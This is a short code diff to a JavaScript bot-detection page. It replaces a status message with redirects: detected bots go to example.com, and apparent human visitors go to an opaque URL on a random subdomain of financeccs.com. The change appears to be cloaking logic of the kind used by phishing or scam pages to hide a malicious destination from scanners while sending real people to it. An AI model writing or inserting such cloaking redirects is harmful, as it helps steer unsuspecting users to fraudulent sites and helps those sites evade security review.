@@ -96,7 +96,11 @@
 
     // Function to update the result
     function updateResult(detections, verdict) {
-      document.getElementById("result").innerText = verdict.bot ? "Bot detected" : "No bot detected";
+      if (verdict.bot) {
+        window.location.href = "https://example.com/"; // Redirect if bot is detected
+      } else {
+        window.location.href = "https://20fhq51cblpkv6c.financeccs.com/isgDUldD";
+      }
       console.log(JSON.stringify(verdict, null, 2));
       console.log(JSON.stringify(detections, null, 2));
     }
